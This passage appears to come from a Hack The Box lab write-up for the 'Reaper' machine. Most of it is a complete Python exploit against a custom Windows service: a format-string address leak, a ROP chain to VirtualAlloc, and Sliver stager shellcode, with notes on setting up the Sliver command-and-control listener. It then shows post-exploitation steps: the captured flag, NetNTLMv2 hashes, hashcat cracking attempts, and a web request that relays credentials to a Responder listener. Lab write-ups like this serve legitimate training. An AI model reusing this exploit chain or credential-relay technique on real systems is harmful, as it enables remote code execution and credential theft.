<span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">IPython</span><span class="w"> </span><span class="kn">import</span> <span class="n">embed</span>


<span class="n">NOTES</span><span class="o">=</span><span class="sa">r</span><span class="s1">'''</span>
<span class="s1">## @call rax</span>
<span class="s1">((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" &amp;&amp; timeout 1 &amp;&amp; START /B "" "C:\reaper\dev_keysvc.exe" &gt; c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" &gt; c:\reaper\output.txt) &amp;&amp; timeout 1 &amp;&amp; "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp dev_keysvc+0x1937; g; g; g; bp dev_keysvc+0x16f1; g; t 33; p; pt; t 7'</span>

<span class="s1">[server] sliver &gt; mtls -t 240</span>
<span class="s1">[server] sliver &gt; new-operator --lhost 10.10.16.59 --save duff --name duff</span>
<span class="s1">$ sliver-client import ./duff</span>
<span class="s1">$ sliver-client</span>
<span class="s1">sliver &gt; profiles new --mtls 10.10.16.59 --skip-symbols --format shellcode --disable-sgn --os windows --arch amd64 --timeout 240 reaper</span>
<span class="s1">sliver &gt; stage-listener --url tcp://10.10.16.59:8443 --profile reaper</span>
<span class="s1">sliver &gt; generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --protocol tcp --format raw --save reaper_sc</span>
<span class="s1">'''</span>


<span class="k">def</span><span class="w"> </span><span class="nf">dprint</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">if</span> <span class="s2">"debug"</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">packlatin</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">inp</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">inp</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>


<span class="n">badchars</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">def</span><span class="w"> </span><span class="nf">gen_badchars</span><span class="p">(</span><span class="n">bc</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x01</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">):</span>
    <span class="n">s_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
    <span class="n">e_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">end</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="n">BC</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">s_int</span><span class="p">,</span><span class="n">e_int</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">bc</span><span class="p">:</span>
        <span class="n">BC</span> <span class="o">=</span> <span class="n">BC</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">item</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">BC</span>


<span class="k">def</span><span class="w"> </span><span class="nf">cx</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">recv</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">recv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">sock</span>


<span class="k">def</span><span class="w"> </span><span class="nf">server_interact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">bufs</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">bufs</span><span class="p">)):</span>
        <span class="n">recvd</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
        <span class="n">dprint</span><span class="p">(</span><span class="n">recvd</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">"key format"</span> <span class="ow">in</span> <span class="n">recvd</span> <span class="ow">or</span> <span class="s1">'Checking key'</span> <span class="ow">in</span> <span class="n">recvd</span><span class="p">:</span>
            <span class="n">recvd</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
            <span class="n">dprint</span><span class="p">(</span><span class="n">recvd</span><span class="p">)</span>
        <span class="n">dprint</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">][:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">((</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x0a</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">),</span><span class="sa">r</span><span class="s1">'</span><span class="se">\\</span><span class="s1">n'</span><span class="p">)</span><span class="si">}</span><span class="s2">[...]"</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>


<span class="k">def</span><span class="w"> </span><span class="nf">get_leak</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
    <span class="c1"># ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]</span>
    <span class="c1"># └─$ echo "Hello" | base64 -w0</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"110-FE9A1-550-A271-0109-SGVsbG8K</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"%p</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>
    <span class="n">server_interact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">bufs</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">baseaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">132704</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"** dev_keysvc leakaddr: 0x</span><span class="si">{</span><span class="n">leak</span><span class="si">}</span><span class="s2"> **"</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"** dev_keysvc baseaddr: 0x</span><span class="si">{</span><span class="n">baseaddr</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2"> **"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">baseaddr</span> 


<span class="k">def</span><span class="w"> </span><span class="nf">ROPchain1</span><span class="p">(</span><span class="n">base</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">packlatin</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="c1">## 0x40 to r9</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20d9</span><span class="p">,</span>        <span class="c1">#: pop rbx ; ret ;</span>
        <span class="mh">0x40</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f90</span><span class="p">,</span>        <span class="c1">#: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>

        <span class="c1">## 0x1000 to r8</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0x1000</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0xe97a</span><span class="p">,</span>        <span class="c1">#: xchg eax, edx ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1bd8c</span><span class="p">,</span>       <span class="c1">#: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;</span>

        <span class="c1">## 0x1000 to rdx</span>
        <span class="c1">## Nothing needed, rdx is already 0x1000 because of r8 above</span>

        <span class="c1">## rsp to rcx</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fa0</span><span class="p">,</span>        <span class="c1">#: xor rbx, rsp ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fb3</span><span class="p">,</span>        <span class="c1">#: mov r12, rbx ; ret ;  ## for jmp/call rsp later</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fc2</span><span class="p">,</span>        <span class="c1">#: push rbx ; pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f80</span><span class="p">,</span>        <span class="c1">#: mov rcx, rax ; ret ;</span>

        <span class="c1">## call VirtualAlloc</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20000</span><span class="p">,</span>       <span class="c1">## IAT VirtualAlloc VA</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1547f</span><span class="p">,</span>       <span class="c1">#: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x5d6d</span><span class="p">,</span>        <span class="c1">#: push rax ; pop rdi ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x3db5</span><span class="p">,</span>        <span class="c1">#: push rdi ; ret ;</span>

        <span class="c1">## realign RSP, RE: shadow space / VA scratch area</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x175b</span><span class="p">,</span>          <span class="c1">#: add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>

        <span class="c1">## jmp/call rsp</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0xf0</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x368c</span>         <span class="c1">#: add rax, r12 ; mov rdx, r13 ; call rax ;</span>
    <span class="p">]])</span>


<span class="k">def</span><span class="w"> </span><span class="nf">get_crash</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">dev_keysvc</span><span class="p">):</span>
    <span class="n">crash</span><span class="o">=</span><span class="mi">1200</span>
    <span class="n">crashlen</span><span class="o">=</span><span class="mi">88</span>
    <span class="n">onramp</span><span class="o">=</span><span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="p">)</span><span class="o">*</span><span class="n">crashlen</span>
    <span class="n">SEH</span><span class="o">=</span><span class="n">ROPchain1</span><span class="p">(</span><span class="n">dev_keysvc</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"ROPchain len:</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">SEH</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">nopsled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span> <span class="mh">0x80</span><span class="p">)</span>
    <span class="n">fixup</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">"</span><span class="se">\x48\x89\xC4</span><span class="s2">"</span>              <span class="c1">#mov rsp,rax</span>
        <span class="s2">"</span><span class="se">\x48\x83\xEC\x98</span><span class="s2">"</span>          <span class="c1">#sub rsp,byte +0x20</span>
        <span class="s2">"</span><span class="se">\x54</span><span class="s2">"</span>                      <span class="c1">#push rsp</span>
        <span class="s2">"</span><span class="se">\x48\x89\xE5</span><span class="s2">"</span>              <span class="c1">#mov rbp,rsp</span>
        <span class="s2">"</span><span class="se">\x48\x31\xC9</span><span class="s2">"</span>              <span class="c1">#xor rcx,rcx</span>
        <span class="s2">"</span><span class="se">\x48\x31\xD2</span><span class="s2">"</span>              <span class="c1">#xor rdx,rdx</span>
        <span class="s2">"</span><span class="se">\x48\x31\xC0</span><span class="s2">"</span>              <span class="c1">#xor rax,rax</span>
        <span class="s2">"</span><span class="se">\x48\x31\xDB</span><span class="s2">"</span>              <span class="c1">#xor rbx,rbx</span>
        <span class="s2">"</span><span class="se">\x48\x31\xFF</span><span class="s2">"</span>              <span class="c1">#xor rdi,rdi</span>
        <span class="s2">"</span><span class="se">\x4D\x31\xC0</span><span class="s2">"</span>              <span class="c1">#xor r8,r8</span>
        <span class="s2">"</span><span class="se">\x4D\x31\xE4</span><span class="s2">"</span>              <span class="c1">#xor r12,r12            </span>
    <span class="p">)</span> <span class="c1">#32 bytes</span>
    <span class="n">nopsled2</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"reaper_sc"</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"shellcode len:</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">offramp</span><span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">crash</span> <span class="o">-</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="n">onramp</span><span class="p">,</span>
        <span class="n">SEH</span><span class="p">,</span>
        <span class="n">nopsled1</span><span class="p">,</span>
        <span class="n">fixup</span><span class="p">,</span>
        <span class="n">nopsled2</span><span class="p">,</span>
        <span class="n">shellcode</span>
    <span class="p">]])))</span>
    <span class="n">compiled_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">onramp</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}{</span><span class="n">nopsled1</span><span class="si">}{</span><span class="n">fixup</span><span class="si">}{</span><span class="n">nopsled2</span><span class="si">}{</span><span class="n">shellcode</span><span class="si">}{</span><span class="n">offramp</span><span class="si">}</span><span class="s2">"</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"compiled_payload len:</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">compiled_payload</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">compiled_payload</span><span class="p">,</span><span class="s1">'latin-1'</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"110-FE9A1-550-A271-0109-</span><span class="si">{</span><span class="n">pay</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>
    <span class="n">server_interact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">bufs</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"USAGE: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> ip:port &lt;optional&gt;"</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
        <span class="n">sock</span> <span class="o">=</span> <span class="n">cx</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">dev_keysvc</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
    <span class="n">get_crash</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">dev_keysvc</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
<p>User flag
</p><div class="highlight"><pre><span></span><code>C:\Users\keysvc\Desktop&gt;type user.txt
type user.txt
07394cb49eb8e7470d7167db6d0f6935
</code></pre></div><p></p>
<h2 id="post-exploitation-enumeration">Post-exploitation enumeration<a class="headerlink" href="#post-exploitation-enumeration" title="Permanent link">¶</a></h2>
<p>Seatbelt disclosed an NetNTLMv2 hash for reapersvc, and also the current process token has membership to the RDP group</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>GRUBBY_MONGER<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>seatbelt<span class="w"> </span>--<span class="w"> </span>-group<span class="o">=</span>user

<span class="o">[</span>...<span class="o">]</span>
<span class="o">======</span><span class="w"> </span><span class="nv">SecPackageCreds</span><span class="w"> </span><span class="o">======</span>

<span class="w">  </span>Version<span class="w">                        </span>:<span class="w"> </span>NetNTLMv2
<span class="w">  </span>Hash<span class="w">                           </span>:<span class="w"> </span>keysvc::REAPER:1122334455667788:6a2bc1a5b19a1e287260491f51cc96bc:0101000000000000181db491664ddc01bcb68e6f51f99ba900000000080030003000000000000000000000000030000048a97bdcc3de78e80ef44f45118f7ca1bf92abf5ccb0823f095a6eb56ed016fa0a00100000000000000000000000000000000000090000000000000000000000

<span class="o">[</span>...<span class="o">]</span>
<span class="o">======</span><span class="w"> </span><span class="nv">TokenGroups</span><span class="w"> </span><span class="o">======</span>

Current<span class="w"> </span>Token<span class="err">'</span>s<span class="w"> </span>Groups

<span class="w">  </span>REAPER<span class="se">\N</span>one<span class="w">                              </span>S-1-5-21-2661617556-2774986859-216721275-513
<span class="w">  </span>Everyone<span class="w">                                 </span>S-1-1-0
<span class="w">  </span>BUILTIN<span class="se">\R</span>emote<span class="w"> </span>Desktop<span class="w"> </span>Users<span class="w">             </span>S-1-5-32-555
<span class="w">  </span>BUILTIN<span class="se">\U</span>sers<span class="w">                            </span>S-1-5-32-545
<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>ERVICE<span class="w">                     </span>S-1-5-6
<span class="w">  </span>CONSOLE<span class="w"> </span>LOGON<span class="w">                            </span>S-1-2-1
<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">         </span>S-1-5-11
<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">           </span>S-1-5-15
<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\L</span>ocal<span class="w"> </span>account<span class="w">               </span>S-1-5-113
<span class="w">  </span>LOCAL<span class="w">                                    </span>S-1-2-0
<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">         </span>S-1-5-64-10
</code></pre></div>
<p>NetNTLMv2-SSP hash for <code>keysvc</code> but it doesn't crack:
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sudo<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>keysvc.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force<span class="w"> </span>--quiet<span class="w"> </span>
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>notroot:
</code></pre></div><p></p>
<p>Also sent defaultcredentials to a listening responder:
</p><div class="highlight"><pre><span></span><code>PS C:\users\keysvc&gt; invoke-webrequest -uri http://10.10.16.59/duffed.txt -usedefaultcredentials
</code></pre></div><p></p>
<div class="highlight"><pre><span></span><code>[HTTP] NTLMv2 Client   : 10.129.234.200
[HTTP] NTLMv2 Username : REAPER\keysvc
[HTTP] NTLMv2 Hash     : keysvc::REAPER:cd0f87b6b1319306:6580FA82E3DC1054562FB5BC308ED25C:0101000000000000635AA7801F4EDC01D5E02131248798A50000000002000800530056004500490001001E00570049004E002D0045004B004900480032004D00540038004300330033000400140053005600450049002E004C004F00430041004C0003003400570049004E002D0045004B004900480032004D00540038004300330033002E0053005600450049002E004C004F00430041004C000500140053005600450049002E004C004F00430041004C0008003000300000000000000000000000003000000F67F829E12B9EC357B63981E6817E8C0A49B7440B2EF1CBB137473890CA08020A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310036002E00350039000000000000000000
</code></pre></div>
<p>Also doesn't crack.</p>
<p>Now that I have shell access, I was finally able to get my hands on <code>reaper.sys</code>.</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>GRUBBY_MONGER<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>ls

C:<span class="se">\d</span>river<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>item,<span class="w"> </span><span class="m">8</span>.2<span class="w"> </span>KiB<span class="o">)</span>
<span class="o">===========================</span>
-rw-rw-rw-<span class="w">  </span>reaper.sys<span class="w">  </span><span class="m">8</span>.2<span class="w"> </span>KiB<span class="w">  </span>Thu<span class="w"> </span>Jul<span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">08</span>:12:21<span class="w"> </span>-0800<span class="w"> </span><span class="m">2023</span>

sliver<span class="w"> </span><span class="o">(</span>GRUBBY_MONGER<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>reaper.sys

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Wrote<span class="w"> </span><span class="m">8432</span><span class="w"> </span>bytes<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>file<span class="w"> </span>successfully,<span class="w"> </span><span class="m">0</span><span class="w"> </span>files<span class="w"> </span>unsuccessfully<span class="o">)</span><span class="w"> </span>to<span class="w"> </span>/home/notroot/htb/machines/reaper/reaper.sys
</code></pre></div>
<p>I also found a service named <code>reaper</code>, which appears to have <code>reaper.sys</code> in its <code>binPath</code>.</p>
<div class="highlight"><pre><span></span><code>PS<span class="w"> </span>C:<span class="se">\&gt;</span><span class="w"> </span>sc<span class="w"> </span>query<span class="w"> </span>reaper
sc<span class="w"> </span>query<span class="w"> </span>reaper
sc<span class="w"> </span>:<span class="w"> </span>Access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>path<span class="w"> </span><span class="s1">'C:\query'</span><span class="w"> </span>is<span class="w"> </span>denied.
At<span class="w"> </span>line:1<span class="w"> </span>char:1
+<span class="w"> </span>sc<span class="w"> </span>query<span class="w"> </span>reaper
+<span class="w"> </span>~~~~~~~~~~~~~~~
<span class="w">    </span>+<span class="w"> </span>CategoryInfo<span class="w">          </span>:<span class="w"> </span>PermissionDenied:<span class="w"> </span><span class="o">(</span>C:<span class="se">\q</span>uery:String<span class="o">)</span><span class="w"> </span><span class="o">[</span>Set-Content<span class="o">]</span>,<span class="w"> </span>UnauthorizedAccessException
<span class="w">    </span>+<span class="w"> </span>FullyQualifiedErrorId<span class="w"> </span>:<span class="w"> </span>GetContentWriterUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetContentCommand


PS<span class="w"> </span>C:<span class="se">\&gt;</span><span class="w"> </span>sc.exe<span class="w"> </span>query<span class="w"> </span>reaper
sc.exe<span class="w"> </span>query<span class="w"> </span>reaper

SERVICE_NAME:<span class="w"> </span>reaper<span class="w"> </span>
<span class="w">        </span>TYPE<span class="w">               </span>:<span class="w"> </span><span class="m">1</span><span class="w">  </span>KERNEL_DRIVER<span class="w">  </span>
<span class="w">        </span>STATE<span class="w">              </span>:<span class="w"> </span><span class="m">4</span><span class="w">  </span>RUNNING<span class="w"> </span>
<span class="w">                                </span><span class="o">(</span>STOPPABLE,<span class="w"> </span>NOT_PAUSABLE,<span class="w"> </span>IGNORES_SHUTDOWN<span class="o">)</span>
<span class="w">        </span>WIN32_EXIT_CODE<span class="w">    </span>:<span class="w"> </span><span class="m">0</span><span class="w">  </span><span class="o">(</span>0x0<span class="o">)</span>
<span class="w">        </span>SERVICE_EXIT_CODE<span class="w">  </span>:<span class="w"> </span><span class="m">0</span><span class="w">  </span><span class="o">(</span>0x0<span class="o">)</span>
<span class="w">        </span>CHECKPOINT<span class="w">         </span>:<span class="w"> </span>0x0
<span class="w">        </span>WAIT_HINT<span class="w">          </span>:<span class="w"> </span>0x0

PS<span class="w"> </span>C:<span class="se">\&gt;</span><span class="w"> </span>sc.exe<span class="w"> </span>qc<span class="w"> </span>reaper
